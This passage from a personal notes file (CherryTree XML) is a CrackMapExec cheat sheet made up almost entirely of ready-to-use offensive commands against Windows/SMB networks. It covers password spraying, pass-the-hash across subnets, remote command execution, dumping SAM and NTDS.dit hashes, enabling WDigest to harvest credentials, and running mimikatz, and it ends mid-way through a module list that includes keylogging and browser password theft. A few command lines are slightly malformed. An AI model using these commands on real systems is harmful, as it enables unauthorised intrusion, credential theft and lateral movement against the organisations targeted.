      <rich_text background="#000000000000">


</rich_text>
      <encoded_png char_offset="463" justification="left" link=""></encoded_png>
    </node>
  </node>
  <node unique_id="145" master_id="0" name="Crackmapexec" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#1c71d8" ts_creation="1670983362" ts_lastsave="1670984149">
    <node unique_id="146" master_id="0" name="CheatSheet" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983381" ts_lastsave="1670983464">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text scale="h3" background="#000000000000">Connexions &amp; Spraying</rich_text>
      <rich_text background="#000000000000">:

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Target format</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb ms.evilcorp.org
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.0 </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.0.2
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.0-28 </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">10</rich_text>
      <rich_text family="monospace" background="#000000000000">.0.0.1-67
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.0/24
crackmapexec smb targets.txt</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Null session</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.10.1 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">""</rich_text>
      <rich_text family="monospace" background="#000000000000"> up </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">""</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Connect to target using local account</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.138 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASSWORD'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Pass the hash against a subnet</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">172</rich_text>
      <rich_text family="monospace" background="#000000000000">.16.157.0/24 -u administrator -H </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'LMHASH:NTHASH'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">172</rich_text>
      <rich_text family="monospace" background="#000000000000">.16.157.0/24 -u administrator -H </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'NTHASH'</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Bruteforcing and Password Spraying</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.0/24 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"admin"</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"password1"</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.0/24 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"admin"</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"password1"</rich_text>
      <rich_text family="monospace" background="#000000000000"> </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"password2"</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.0/24 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"admin1"</rich_text>
      <rich_text family="monospace" background="#000000000000"> </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"admin2"</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">"P@ssword"</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Enumeration</rich_text>
      <rich_text background="#000000000000">:

</rich_text>
      <rich_text scale="h4" background="#000000000000">Users </rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Enumerate users</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --users

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Perform RID Bruteforce to get users</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --rid-brute

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Enumerate domain groups</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --groups

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Enumerate local users</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-users</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text scale="h4" background="#000000000000">Hosts </rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Generate a list of relayable hosts (SMB Signing disabled)</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.0/24 --gen-relay-list output.txt

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Enumerate available shares</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.138 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASSWORD'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth --shares

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Get the active sessions</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --sessions

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Check logged in users</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --lusers

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Get the password policy</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'user'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --pass-pol</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Execution &amp; Co</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># CrackMapExec has 3 different command execution methods (in default order) :</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># - wmiexec --&gt; WMI</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># - atexec --&gt; scheduled task</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># - smbexec --&gt; creating and running a service</rich_text>
      <rich_text family="monospace" background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Execute command through cmd.exe (admin privileges required)</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.10.11 -u Administrator -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'P@ssw0rd'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -x </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'whoami'</rich_text>
      <rich_text family="monospace" background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Force the smbexec method</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -x </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'net user Administrator /domain'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --exec-method smbexec

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Execute commands through PowerShell (admin privileges required)</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.10.11 -u Administrator -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'P@ssw0rd'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -X </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'whoami'</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Getting Credentials</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Dump local SAM hashes</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth --sam</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Enable or disable WDigest to get credentials from the LSA Memory</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth --wdigest enable
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth --wdigest disable

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Then you juste have to wait the user logoff and logon again</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># But you can force the logoff</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -x </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'quser'</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -x </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'logoff &lt;sessionid&gt;'</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Dump the NTDS.dit from DC using methods from secretsdump.py</rich_text>
      <rich_text family="monospace" background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Uses drsuapi RPC interface create a handle, trigger replication</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># and combined with additional drsuapi calls to convert the resultant</rich_text>
      <rich_text family="monospace" background="#000000000000"> 
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># linked-lists into readable format</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.100 -u UserNAme -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASSWORDHERE'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --ntds

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Uses the Volume Shadow copy Service</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.100 -u UserNAme -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASSWORDHERE'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --ntds vss

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Dump the NTDS.dit password history</rich_text>
      <rich_text family="monospace" background="#000000000000">
smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.1.0/24 -u UserNAme -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASSWORDHERE'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --ntds-history</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Using the database</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># The database automatically store every hosts reaches by CME and all credentials with admin access</rich_text>
      <rich_text family="monospace" background="#000000000000">
$ cmedb

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Using workspaces</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb&gt; workspace create test
cmedb&gt; workspace test

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Access a protocol database and switch back</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">test</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000">&gt; proto smb
cmedb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">test</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000">&gt; back

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># List stored hosts</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb&gt; hosts

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># View detailed infos for a specific machine (including creds)</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb&gt; hosts &lt;hostname&gt;

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Get stored credentials</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb&gt; creds

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Get credentials access for a specific account</rich_text>
      <rich_text family="monospace" background="#000000000000">
cmedb&gt; creds &lt;username&gt;

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Using credentials from the database</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.100.1 -id &lt;credsID&gt;</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Modules</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># List available modules</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb -L

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Module information</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb -M mimikatz --module-info

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># View module options</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb -M mimikatz --options

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Mimikatz module</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth -M mimikatz
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -M mimikatz
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u Administrator -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'P@ssw0rd'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -M mimikatz -o COMMAND</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">=</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'privilege::debug'</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> Get-ComputerDetails       Enumerates sysinfo
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#8045ff">\'</rich_text>
      <rich_text family="monospace" background="#000000000000"> machine
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> empire_exec               Uses Empire</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#8045ff">\'</rich_text>
      <rich_text family="monospace" background="#000000000000">s RESTful API to generate a launcher </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#00a8c8">for</rich_text>
      <rich_text family="monospace" background="#000000000000"> the specified listener and executes it
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">s</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> via WMI
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> enum_dns                  Uses WMI to dump DNS from an AD DNS Server
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> get_keystrokes            Logs keys pressed, time and the active window
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> get_netdomaincontroller   Enumerates all domain controllers
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> get_netrdpsession         Enumerates all active RDP sessions
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> get_timedscreenshot       Takes screenshots at a regular interval
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> gpp_autologin             Searches the domain controller </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#00a8c8">for</rich_text>
      <rich_text family="monospace" background="#000000000000"> registry.xml to find autologon information and returns the username and password.
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> gpp_password              Retrieves the plaintext password and other information </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#00a8c8">for</rich_text>
      <rich_text family="monospace" background="#000000000000"> accounts pushed through Group Policy Preferences.
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> invoke_sessiongopher      Digs up saved session information </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#00a8c8">for</rich_text>
      <rich_text family="monospace" background="#000000000000"> PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> invoke_vnc                Injects a VNC client in memory
